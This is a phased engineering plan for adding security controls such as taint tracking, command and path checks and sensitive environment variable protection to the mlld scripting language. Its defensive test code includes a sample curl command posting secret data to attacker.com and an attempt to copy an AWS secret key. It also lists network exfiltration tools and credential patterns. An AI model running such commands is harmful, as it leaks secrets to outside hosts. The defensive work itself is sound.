# Security Integration Plan v2: Clean Re-implementation Strategy

## Overview

This plan details a phased approach to re-implement mlld's security infrastructure on top of the current main branch, leveraging the resolver pattern and incorporating lessons learned from the security-wip implementation.

## Guiding Principles

1. **Incremental Progress**: Each phase produces working, testable code
2. **Learning-Based**: Exit criteria include updating the next phase based on discoveries
3. **Test-Driven**: Security tests guide implementation
4. **Clean Architecture**: Leverage resolver pattern for elegant security integration
5. **Complete Coverage**: Ensure all security requirements are met by plan completion

---

## Phase 0: Documentation and Analysis (2 days)

### Objectives
- Comprehensively document existing security implementation
- Create test inventory
- Identify all security components
- Map integration points

### Tasks

#### 0.1 Security Component Inventory
```bash
git checkout security-wip
mkdir security-migration-docs
```

Create `security-migration-docs/COMPONENT-INVENTORY.md`:
- [ ] List all security classes with their responsibilities
- [ ] Document each class's public API
- [ ] Note dependencies between components
- [ ] Identify which are core vs. auxiliary

Expected components:
- SecurityManager (orchestrator)
- TaintTracker (taint propagation)
- CommandAnalyzer (command safety)
- PathValidator (file access)
- PolicyManager (policy decisions)
- TrustEvaluator (trust levels)
- ImportApproval (import safety)
- ImmutableCache (secure caching)
- GistTransformer (URL handling)

#### 0.2 Integration Points Documentation
Create `security-migration-docs/INTEGRATION-POINTS.md`:
- [ ] Map where each security check occurs in current code
- [ ] Document the context passed to each check
- [ ] Note any side effects (logging, caching)
- [ ] Identify patterns in security integration

#### 0.3 Test Case Inventory
Create `security-migration-docs/TEST-INVENTORY.md`:
```bash
# Find all security-related tests
find . -name "*.test.ts" -o -name "*.spec.ts" | xargs grep -l "security\|Security\|taint\|Taint" > security-tests.txt
```
- [ ] List all security test files
- [ ] Categorize tests by feature
- [ ] Note which tests are integration vs. unit
- [ ] Identify missing test coverage

#### 0.4 Security Requirements Matrix
Create `security-migration-docs/REQUIREMENTS-MATRIX.md`:
| Requirement | Current Implementation | Test Coverage | Priority |
|------------|----------------------|---------------|----------|
| Command execution safety | CommandAnalyzer + SecurityManager.checkCommand() | ✓ | P0 |
| Path access control | PathValidator + SecurityManager.checkPath() | ✓ | P0 |
| Environment variable protection | allowedEnv in LockFile | ✓ | P0 |
| @output directive security | Not implemented | ✗ | P0 |
| Import approval | ImportApproval class | ✓ | P1 |
| Taint tracking | TaintTracker class | Partial | P1 |
| Development mode detection | Global lock file check | ✓ | P1 |
| TTL/Trust metadata | In progress | ✗ | P2 |

#### 0.5 Commit History Analysis
```bash
# Generate commit list for cherry-picking
git log --oneline security-wip ^main > security-migration-docs/SECURITY-COMMITS.txt

# Categorize commits by component
git log --oneline --grep="SecurityManager" security-wip ^main > security-migration-docs/commits-security-manager.txt
git log --oneline --grep="TaintTracker" security-wip ^main > security-migration-docs/commits-taint-tracker.txt
# ... etc for each component
```

### Exit Criteria
- [ ] Complete component inventory with APIs documented
- [ ] All integration points mapped with context requirements
- [ ] Test inventory complete with coverage gaps identified
- [ ] Requirements matrix shows clear priorities
- [ ] Commit history organized for cherry-picking

### Plan Updates for Phase 1
Based on Phase 0 findings, update Phase 1 to:
- Adjust component implementation order based on dependencies
- Add any discovered components not in original list
- Modify integration approach based on patterns found
- Include fixes for test coverage gaps

---

## Phase 1: Core Security Infrastructure (3 days)

### Objectives
- Port core security components to main branch
- Establish foundation for security integration
- Create SecurityResolver for import security

### Setup
```bash
git checkout main
git pull origin main
git checkout -b security-integration-v2

# Create security directories
mkdir -p security/{core,interfaces,errors,utils}
mkdir -p interpreter/security
mkdir -p tests/security
```

### Tasks

#### 1.1 Port Security Interfaces
Create `security/interfaces/index.ts`:
```typescript
export interface SecurityContext {
  file?: string;
  line?: number;
  column?: number;
  directive?: string;
  metadata?: Record<string, any>;
}

export interface SecurityDecision {
  allowed: boolean;
  reason?: string;
  requiresApproval?: boolean;
  warnings?: string[];
}

export interface TaintInfo {
  sources: string[];
  level: 'high' | 'medium' | 'low';
  metadata?: Record<string, any>;
}
```

- [ ] Port all security interfaces
- [ ] Ensure compatibility with main branch types
- [ ] Add JSDoc documentation

#### 1.2 Port SecurityManager Core
Cherry-pick or recreate `SecurityManager` class:
```bash
# If cherry-pick works:
git cherry-pick <security-manager-commit-hash>

# If conflicts, manually recreate in security/core/SecurityManager.ts
```

- [ ] Port SecurityManager without dependencies first
- [ ] Stub out external dependencies
- [ ] Ensure it compiles with main branch
- [ ] Add unit tests

#### 1.3 Create SecurityResolver
New file `core/resolvers/SecurityResolver.ts`:
```typescript
import { IResolver, ResolveResult } from './types';
import { SecurityManager } from '@security/core/SecurityManager';

export class SecurityResolver implements IResolver {
  constructor(
    private innerResolver: IResolver,
    private securityManager: SecurityManager
  ) {}

  async resolve(reference: string, options?: ResolveOptions): Promise<ResolveResult> {
    // Pre-resolution security check
    const decision = await this.securityManager.checkImport(reference, {
      resolver: this.innerResolver.constructor.name,
      options
    });

    if (!decision.allowed) {
      throw new MlldSecurityError(`Import blocked: ${decision.reason}`, {
        code: 'SECURITY_BLOCKED',
        reference
      });
    }

    // Delegate to inner resolver
    const result = await this.innerResolver.resolve(reference, options);

    // Post-resolution security actions
    await this.securityManager.trackImport(reference, result.content);
    this.securityManager.trackTaint(result.content.content, TaintSource.IMPORT);

    return result;
  }

  supports(reference: string): boolean {
    return this.innerResolver.supports(reference);
  }
}
```

- [ ] Implement SecurityResolver
- [ ] Add tests for resolver wrapping
- [ ] Test with each resolver type

#### 1.4 Port TaintTracker
```bash
# Cherry-pick or recreate
git cherry-pick <taint-tracker-commit>
```

- [ ] Port TaintTracker class
- [ ] Integrate with SecurityManager
- [ ] Add taint propagation tests
- [ ] Ensure memory efficiency

#### 1.5 Port Core Errors
Create security-specific errors:
- [ ] MlldSecurityError
- [ ] TaintViolationError  
- [ ] PolicyViolationError
- [ ] Include rich context for debugging

#### 1.6 Integration with Environment
Update `interpreter/env/Environment.ts`:
```typescript
// Add to constructor
if (!parent && options?.security?.enabled !== false) {
  this.securityManager = new SecurityManager(basePath);
  
  // Wrap all resolvers with SecurityResolver
  if (this.resolverManager) {
    this.wrapResolversWithSecurity();
  }
}

private wrapResolversWithSecurity(): void {
  const resolvers = this.resolverManager!.getResolvers();
  resolvers.forEach(resolver => {
    const wrapped = new SecurityResolver(resolver, this.securityManager!);
    this.resolverManager!.replaceResolver(resolver, wrapped);
  });
}
```

- [ ] Add security initialization
- [ ] Integrate resolver wrapping
- [ ] Maintain backward compatibility
- [ ] Add feature flags for security

### Testing Checklist
- [ ] SecurityManager initializes correctly
- [ ] SecurityResolver wraps resolvers properly
- [ ] Taint tracking works for basic cases
- [ ] No performance regression
- [ ] All existing tests still pass

### Exit Criteria
- [ ] Core security components compile and run
- [ ] SecurityResolver successfully wraps all resolver types
- [ ] Basic taint tracking operational
- [ ] Integration tests pass for imports
- [ ] No regression in existing functionality

### Plan Updates for Phase 2
Based on Phase 1 learnings:
- Adjust component integration approach
- Update resolver wrapping strategy if needed
- Modify Environment integration based on discoveries
- Add any missing interfaces or types
- Document any architectural decisions made

---

## Phase 2: Command and Path Security (3 days)

### Objectives
- Implement command execution security
- Add path validation
- Integrate with existing evaluators
- Port policy management

### Tasks

#### 2.1 Port CommandAnalyzer
```bash
git cherry-pick <command-analyzer-commit>
```

Update for main branch compatibility:
- [ ] Port CommandAnalyzer class
- [ ] Update for new command execution in main
- [ ] Add pattern detection for dangerous commands
- [ ] Integrate with SecurityManager

#### 2.2 Port PathValidator  
- [ ] Port PathValidator class
- [ ] Add path traversal detection
- [ ] Implement allowed paths configuration
- [ ] Add symlink resolution security

#### 2.3 Integrate Command Security
Update `interpreter/eval/run.ts`:
```typescript
// In evaluateRun function
const securityManager = env.getSecurityManager();
if (securityManager) {
  const context: SecurityContext = {
    file: env.getCurrentFilePath(),
    line: directive.location?.start.line,
    directive: 'run',
    metadata: directive.metadata
  };
  
  const decision = await securityManager.checkCommand(command, context);
  if (!decision.allowed) {
    throw new MlldSecurityError(
      `Command blocked: ${decision.reason}`,
      directive.location
    );
  }
}
```

- [ ] Add security checks before command execution
- [ ] Pass proper context
- [ ] Handle security decisions
- [ ] Add command audit logging

#### 2.4 Integrate Path Security
Update `interpreter/env/Environment.ts` in `readFile` method:
```typescript
// In readFile method
if (!this.isURL(pathOrUrl)) {
  const resolvedPath = await this.resolvePath(pathOrUrl);
  
  const securityManager = this.getSecurityManager();
  if (securityManager) {
    const decision = await securityManager.checkPath(resolvedPath, 'read');
    if (!decision.allowed) {
      throw new MlldFileSystemError(
        `Path access denied: ${decision.reason}`
      );
    }
  }
  
  const content = await this.fileSystem.readFile(resolvedPath);
  
  // Track taint
  if (securityManager) {
    securityManager.trackTaint(content, TaintSource.FILE_SYSTEM);
  }
  
  return content;
}
```

- [ ] Add path security checks
- [ ] Implement for read/write operations
- [ ] Add taint tracking for file content
- [ ] Test with various path patterns

#### 2.5 Port PolicyManager
- [ ] Port PolicyManager for policy decisions
- [ ] Add default policies
- [ ] Implement policy loading from lock file
- [ ] Add policy override mechanisms

#### 2.6 Development Mode Detection
Implement development mode detection:
```typescript
// In SecurityManager
private detectDevelopmentMode(): boolean {
  // Check for global lock file
  const globalLockPath = path.join(os.homedir(), '.mlld', 'lock.json');
  return fs.existsSync(globalLockPath);
}
```

- [ ] Implement dev mode detection
- [ ] Add different security levels
- [ ] Test mode switching
- [ ] Document security implications

### Testing Checklist
- [ ] Command blocking works correctly
- [ ] Path validation prevents traversal
- [ ] Taint tracking on file reads
- [ ] Policy decisions are enforced
- [ ] Dev mode detection accurate

### Exit Criteria
- [ ] All command execution secured
- [ ] Path operations validated
- [ ] Policies enforced correctly
- [ ] Integration tests for commands pass
- [ ] No regression in file operations

### Plan Updates for Phase 3
- Document any command patterns discovered
- Update path validation based on edge cases
- Refine policy structure if needed
- Adjust integration patterns
- Note performance impacts

---

## Phase 3: Lock File and Trust System (2 days)

### Objectives
- Port lock file security features
- Implement TTL system
- Add trust level support
- Create allowedEnv filtering

### Tasks

#### 3.1 Extend Lock File
Update `core/registry/LockFile.ts` to merge security features:
```typescript
interface LockFileData {
  // Existing fields
  version: string;
  imports: Record<string, ImportEntry>;
  
  // Security fields (from security-wip)
  security?: {
    allowedEnv?: string[];
    allowedEnvWrite?: string[];
    allowedCommands?: string[];
    blockedPatterns?: string[];
    trustedDomains?: string[];
  };
  
  // TTL rules
  cache?: {
    rules?: Array<{
      pattern: string;
      ttl: number;
      trust?: 'verified' | 'trusted' | 'unverified';
    }>;
  };
}
```

- [ ] Merge lock file interfaces
- [ ] Add security field support
- [ ] Implement backward compatibility
- [ ] Add migration for old lock files

#### 3.2 Port TrustEvaluator
- [ ] Port TrustEvaluator class
- [ ] Integrate with lock file trust rules
- [ ] Add trust level calculations
- [ ] Implement trust inheritance

#### 3.3 Implement TTL System
Create `interpreter/security/TTLManager.ts`:
```typescript
export class TTLManager {
  constructor(private lockFile: LockFile) {}
  
  getTTL(url: string): number {
    const rules = this.lockFile.getCacheRules();
    for (const rule of rules) {
      if (new RegExp(rule.pattern).test(url)) {
        return rule.ttl;
      }
    }
    return 300000; // 5 min default
  }
  
  getTrust(url: string): TrustLevel {
    // Implementation
  }
}
```

- [ ] Implement TTL calculations
- [ ] Add pattern matching for URLs
- [ ] Integrate with URL cache
- [ ] Test various TTL scenarios

#### 3.4 AllowedEnv Implementation
Update `interpreter/eval/input.ts` (if exists) or create:
```typescript
// In @INPUT creation
private filterEnvironmentVariables(): Record<string, string> {
  const allowed = this.lockFile?.getAllowedEnv() || [];
  const filtered: Record<string, string> = {};
  
  for (const key of allowed) {
    if (process.env[key]) {
      filtered[key] = process.env[key];
    }
  }
  
  return filtered;
}
```

- [ ] Implement env var filtering
- [ ] Update @INPUT creation
- [ ] Add wildcard support
- [ ] Test with various env configs

#### 3.5 Security Metadata in Directives
Update grammar/parser to support:
```
@path config = "https://example.com/config.json" {ttl: 3600, trust: verified}
```

- [ ] Check if grammar supports metadata
- [ ] Update directive evaluators to extract metadata
- [ ] Pass metadata to security context
- [ ] Test metadata parsing

### Testing Checklist
- [ ] Lock file security fields load correctly
- [ ] TTL rules apply to URL fetches
- [ ] Trust levels calculated properly
- [ ] Env vars filtered in @INPUT
- [ ] Metadata parsed from directives

### Exit Criteria
- [ ] Lock file supports all security fields
- [ ] TTL system operational
- [ ] Trust evaluation working
- [ ] AllowedEnv filtering active
- [ ] Integration tests pass

### Plan Updates for Phase 4
- Note any grammar limitations found
- Document metadata extraction patterns
- Update TTL strategies based on testing
- Refine trust level definitions
- Plan for backward compatibility

---

## Phase 4: Output Security and Missing Features (3 days)

### Objectives
- Implement @output directive security
- Add sensitive variable detection
- Complete taint propagation
- Implement remaining security features

### Tasks

#### 4.1 Create Output Security
Create `interpreter/eval/output.ts` (from IMPLEMENTATION-CODE-CHANGES.md):
```typescript
// In evaluateOutput
async function evaluateOutput(
  directive: DirectiveNode,
  env: Environment
): Promise<EvalResult> {
  // ... existing code ...
  
  if (targetType === 'env') {
    const securityManager = env.getSecurityManager();
    if (securityManager) {
      const context: SecurityContext = {
        file: env.getCurrentFilePath(),
        line: directive.location?.start.line,
        directive: 'output',
        metadata: { targetVar: varName }
      };
      
      await securityManager.checkEnvVarWrite(varName, content, context);
    }
    
    // Check for sensitive variables
    if (isSensitiveVariable(varName)) {
      throw new MlldSecurityError(
        `Cannot write to sensitive environment variable: ${varName}`,
        directive.location
      );
    }
    
    process.env[varName] = content;
  }
}
```

- [ ] Implement checkEnvVarWrite in SecurityManager
- [ ] Add sensitive variable detection
- [ ] Integrate with lock file allowedEnvWrite
- [ ] Add audit logging for env writes
- [ ] Test with various output targets

#### 4.2 Sensitive Variable Detection
Create list of sensitive patterns:
```typescript
const SENSITIVE_PATTERNS = [
  /^AWS_/,
  /^AZURE_/,
  /^GCP_/,
  /_KEY$/,
  /_SECRET$/,
  /_TOKEN$/,
  /_PASSWORD$/,
  /^GITHUB_/,
  /^NPM_/,
  /^DATABASE_URL$/,
  /^MONGODB_URI$/,
  /^REDIS_URL$/
];

function isSensitiveVariable(name: string): boolean {
  return SENSITIVE_PATTERNS.some(pattern => pattern.test(name));
}
```

- [ ] Implement comprehensive patterns
- [ ] Add configuration for custom patterns
- [ ] Create bypass mechanism for dev mode
- [ ] Add warnings for potential sensitive vars

#### 4.3 Complete Taint Propagation
Enhance taint tracking in interpolation:
```typescript
// In interpolate function
export async function interpolate(
  nodes: MlldNode[],
  env: Environment,
  context?: InterpolationContext
): Promise<string> {
  const result = await interpolateNodes(nodes, env, context);
  
  const securityManager = env.getSecurityManager();
  if (securityManager) {
    // Check if any interpolated values are tainted
    const taintedSources: string[] = [];
    
    for (const node of nodes) {
      if (isVariableReference(node)) {
        const value = await evaluateVariableRef(node, env);
        const taint = securityManager.getTaint(String(value));
        if (taint) {
          taintedSources.push(...taint.sources);
        }
      }
    }
    
    if (taintedSources.length > 0) {
      securityManager.trackTaint(result, TaintSource.MIXED, {
        sources: taintedSources
      });
    }
  }
  
  return result;
}
```

- [ ] Track taint through interpolation
- [ ] Handle mixed taint sources
- [ ] Add taint level calculations
- [ ] Test complex interpolation scenarios

#### 4.4 Network Exfiltration Prevention
Enhance command analyzer for network commands:
```typescript
// In CommandAnalyzer
const NETWORK_COMMANDS = [
  'curl', 'wget', 'nc', 'netcat', 'telnet',
  'ssh', 'scp', 'rsync', 'ftp', 'sftp'
];

private detectNetworkExfiltration(command: string): boolean {
  // Check for network commands with tainted data
  const parsed = shellQuote.parse(command);
  
  for (let i = 0; i < parsed.length; i++) {
    if (NETWORK_COMMANDS.includes(String(parsed[i]))) {
      // Check subsequent args for tainted data
      for (let j = i + 1; j < parsed.length; j++) {
        const arg = String(parsed[j]);
        if (this.securityManager.isTainted(arg)) {
          return true;
        }
      }
    }
  }
  
  return false;
}
```

- [ ] Implement network command detection
- [ ] Check for tainted data in arguments
- [ ] Add configurable network command list
- [ ] Test various exfiltration attempts

#### 4.5 Import Chain Validation
Ensure imports can't bypass security:
```typescript
// In SecurityResolver
async resolve(reference: string, options?: ResolveOptions): Promise<ResolveResult> {
  // Track import chain
  const importChain = this.securityManager.getImportChain();
  if (importChain.length > 10) {
    throw new MlldSecurityError('Import chain too deep');
  }
  
  // Check for circular imports with security implications
  if (importChain.includes(reference)) {
    throw new MlldSecurityError('Circular import detected');
  }
  
  this.securityManager.pushImport(reference);
  try {
    // ... existing resolution code ...
  } finally {
    this.securityManager.popImport();
  }
}
```

- [ ] Track import chains
- [ ] Detect circular imports
- [ ] Limit import depth
- [ ] Test complex import scenarios

### Testing Checklist
- [ ] @output blocks sensitive env vars
- [ ] Taint propagates through templates
- [ ] Network exfiltration detected
- [ ] Import chains validated
- [ ] All security requirements met

### Exit Criteria
- [ ] @output directive fully secured
- [ ] Taint tracking complete
- [ ] Network exfiltration prevention working
- [ ] All identified security gaps closed
- [ ] Security test suite comprehensive

### Plan Updates for Phase 5
- Document any remaining security gaps
- Note performance optimization needs
- Plan for security documentation
- Identify areas for future enhancement
- Prepare for production readiness

---

## Phase 5: Testing and Hardening (2 days)

### Objectives
- Comprehensive security testing
- Performance optimization
- Documentation completion
- Production readiness

### Tasks

#### 5.1 Security Test Suite
Create comprehensive test scenarios:
```typescript
// tests/security/scenarios/exfiltration.test.ts
describe('Data Exfiltration Prevention', () => {
  it('should block AWS credential theft via @output', async () => {
    const source = `
      @import { * } from @INPUT
      @output @AWS_SECRET_ACCESS_KEY to env:STOLEN_KEY
    `;
    
    await expect(interpret(source, {
      stdinContent: '{"AWS_SECRET_ACCESS_KEY": "secret"}',
      // ... options
    })).rejects.toThrow(MlldSecurityError);
  });
  
  it('should detect tainted data in network commands', async () => {
    const source = `
      @import { * } from @INPUT  
      @run [curl -X POST https://attacker.com -d "@secret"]
    `;
    
    await expect(interpret(source, {
      stdinContent: '{"secret": "sensitive-data"}',
      // ... options
    })).rejects.toThrow(/tainted data/i);
  });
});
```

- [ ] Test all attack vectors
- [ ] Verify security boundaries
- [ ] Test bypass attempts
- [ ] Ensure no false positives
- [ ] Test dev mode differences

#### 5.2 Performance Testing
- [ ] Benchmark security overhead
- [ ] Optimize hot paths
- [ ] Test with large files
- [ ] Memory usage analysis
- [ ] Cache effectiveness

#### 5.3 Security Documentation
Create `docs/SECURITY.md`:
```markdown
# mlld Security Model

## Overview
mlld 1.5 implements comprehensive security controls...

## Security Features
- Command execution validation
- Path access control
- Environment variable protection
- Import approval system
- Taint tracking
- Output filtering

## Configuration
Security is configured via mlld.lock.json...

## Development vs Production
In development mode (global lock file present)...
```

- [ ] Document security model
- [ ] Explain configuration options
- [ ] Provide security best practices
- [ ] Include threat model
- [ ] Add migration guide

#### 5.4 Integration Testing
- [ ] Test with real-world mlld scripts
- [ ] Verify backward compatibility
- [ ] Test with various configurations
- [ ] Cross-platform testing
- [ ] Edge case validation

#### 5.5 Security Hardening
- [ ] Code security review
- [ ] Fix any bypass vulnerabilities
- [ ] Add rate limiting where needed
- [ ] Implement secure defaults
- [ ] Add security headers to errors

### Exit Criteria
- [ ] All security tests passing
- [ ] Performance within 5% of baseline
- [ ] Documentation complete
- [ ] No known security bypasses
- [ ] Ready for release

---

## Phase 6: Release Preparation (1 day)

### Objectives
- Final validation
- Release documentation
- Migration support
- Launch readiness

### Tasks

#### 6.1 Final Security Audit
- [ ] Run all security tests
- [ ] Verify threat model coverage
- [ ] Check for regressions
- [ ] Validate error messages
- [ ] Confirm logging/auditing

#### 6.2 Migration Guide
Create `MIGRATION-TO-1.5.md`:
- [ ] Breaking changes
- [ ] New security features
- [ ] Configuration migration
- [ ] Common issues and solutions
- [ ] Security best practices

#### 6.3 Release Notes
- [ ] Security features summary
- [ ] Performance impact
- [ ] Configuration examples
- [ ] Acknowledgments
- [ ] Future roadmap

#### 6.4 Final Cleanup
- [ ] Remove debug code
- [ ] Update dependencies
- [ ] Fix any linting issues
- [ ] Update version numbers
- [ ] Tag release

### Exit Criteria
- [ ] All tests green
- [ ] Documentation complete
- [ ] Migration guide tested
- [ ] Performance acceptable
- [ ] Ready to ship

---

## Success Metrics

1. **Security Coverage**
   - ✅ All identified attack vectors mitigated
   - ✅ No security regressions
   - ✅ Comprehensive test suite

2. **Performance**
   - ✅ < 5% overhead for security checks
   - ✅ Efficient taint tracking
   - ✅ Minimal memory impact

3. **Usability**
   - ✅ Clear error messages
   - ✅ Easy configuration
   - ✅ Good developer experience

4. **Compatibility**
   - ✅ Backward compatible
   - ✅ Smooth migration path
   - ✅ No breaking changes without notice

## Risk Mitigation

1. **Technical Risks**
   - Keep security-wip branch as reference
   - Incremental implementation
   - Comprehensive testing at each phase

2. **Schedule Risks**
   - Each phase produces working code
   - Can ship with partial features
   - Clear priorities (P0, P1, P2)

3. **Quality Risks**
   - Test-driven development
   - Security review at each phase
   - Performance benchmarking

## Timeline Summary

- Phase 0: 2 days - Documentation and Analysis
- Phase 1: 3 days - Core Security Infrastructure  
- Phase 2: 3 days - Command and Path Security
- Phase 3: 2 days - Lock File and Trust System
- Phase 4: 3 days - Output Security and Missing Features
- Phase 5: 2 days - Testing and Hardening
- Phase 6: 1 day - Release Preparation

**Total: 16 days** (approximately 3 weeks with buffer)

## Next Steps

1. Begin Phase 0 immediately
2. Create security-migration-docs directory
3. Start component inventory
4. Set up test environment
5. Schedule daily progress reviews

This plan ensures systematic, testable progress while maintaining flexibility to adapt based on discoveries during implementation.